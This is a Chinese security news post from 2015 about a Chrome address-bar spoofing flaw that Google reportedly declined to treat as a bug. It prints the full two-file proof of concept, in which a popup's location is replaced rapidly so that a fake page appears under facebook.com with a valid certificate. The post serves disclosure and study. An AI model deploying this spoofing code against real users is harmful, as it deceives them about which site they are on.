谷歌浏览器地址栏欺骗漏洞poc

2015-07-03 11:50:15 阅读：18477次 点赞(0) 收藏 来源： 360安全播报

国外安全研究员在完全公开的邮件列表上发布了一个chrome 地址修改的欺骗漏洞证明。（根据原出版物，David Leo(david.leo () deusen co uk)他将这个漏洞报告给谷歌，但谷歌并不认为这是个漏洞。

这个版本的chrome浏览器欺骗了facebook.com网站的HTTPS的一个版本。但出人意料的是，它甚至可以显示出合法的绿色证书：

你可以尝试进行现场演示，但需要注意的是，你可能需要尝试多次为了证明chrome的这个漏洞。

有一个连接时间条件。但是如果你在本地克隆下来,那么就有足够的时间证明它。

需要注意的是，你不能用伪造的网页交互，这样会使这个漏洞的程度被限制，因为它不能被用来做直接的网络钓鱼。

content.html

<html>
    <body>
        This is not facebook.com! This is EVIL!
        <script>
            window.location.href = 'https://facebook.com';
        </script>
    </body>
</html>

index.html

<html>
    <head>
        <script>
            function next() {
                w.location.replace('https://facebook.com/?'+n);
                n++;
                setTimeout("next();",15);
                setTimeout("next();",25);
            }
            function f() {
                w = window.open("content.html", "_blank", "width=500 height=500");
                i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); n = 0; next(); }", 5);
            }
        </script>
    </head>

    <body>
        <a href="#" onclick="f()">Login with Facebook</a>
    </body>
</html>
